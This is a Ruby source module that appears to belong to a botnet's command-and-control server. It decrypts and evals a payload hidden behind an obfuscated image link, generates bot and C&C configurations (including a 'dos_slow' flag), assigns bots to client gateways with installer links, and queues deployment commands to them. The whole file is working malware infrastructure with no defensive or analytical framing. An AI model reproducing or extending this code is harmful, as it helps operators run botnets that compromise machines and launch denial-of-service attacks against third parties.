# frozen_string_literal: true

module BotHelper
  include CryptHelper
  include OffuscateHelper
  include ContentHelper

  def recover_register_payload(image, url, ref_offuscate, cipher_key, cipher_iv)
    tag = unofuscate_image_link(url, ref_offuscate)
    plain_info = decrypt(image, tag, cipher_key, cipher_iv)
    plain_info

    eval(plain_info)
  end

  def generate_bot_config
    {
      uri: Parameter.c_c_uri,
      pool: Parameter.c_c_pool,
      token: Digest::SHA2.hexdigest(SecureRandom.urlsafe_base64(12) + Time.now.to_s)
    }
  end

  def generate_settings_for_bot_client(client_gateway)
    key_iv = generate_key_iv
    {
      "client_c_uri": client_gateway.client_setting['uri'],
      "client_c_pool": client_gateway.client_setting['pool'],
      "client_c_token": Digest::SHA2.hexdigest(SecureRandom.urlsafe_base64(24) + Time.now.to_s),
      "client_c_cipher_key": key_iv[:key],
      "client_c_cipher_iv": key_iv[:iv],
      "bot_id": SecureRandom.uuid,
      "dos_slow": false
    }
  end

  def prepare_bots_for_client_gateway(client_gateway_id, quantity_bots)
    client_gateway = ClientGateway.find_by(id: client_gateway_id)

    raise CustomError.new(message: 'Bad Client Gateway', code: '1000') if client_gateway.blank?

    available_bots = Bot.available_to_use
    picked_bots = available_bots.sample(quantity_bots)
    picked_bots.each do |b|
      bot_client_config = {
        settings: generate_settings_for_bot_client(client_gateway),
        installer_link: get_client_installer_for_bot
      }

      settings = b.bot_settings.only_active
      settings.update(bot_client_config: bot_client_config)
      b.update(client_gateway_id: client_gateway.id)
    end
  end

  def deploy_client_bots(client_gateway_id)
    client_gateway = ClientGateway.find_by(id: client_gateway_id)

    raise CustomError.new(message: 'Bad Client Gateway', code: '1000') if client_gateway.blank?

    command_code = '002'.to_sym
    c = BotCommandPool.available_commands[command_code]

    client_gateway.bots.each do |b|
      b.bot_command_pools.create(
        command: command_code,
        metadata: {
          command: command_code,
          type: c[:type],
          type_2: c[:type_2],
          extra: b.bot_settings.only_active.bot_client_config
        }
      )
    end
  end
end
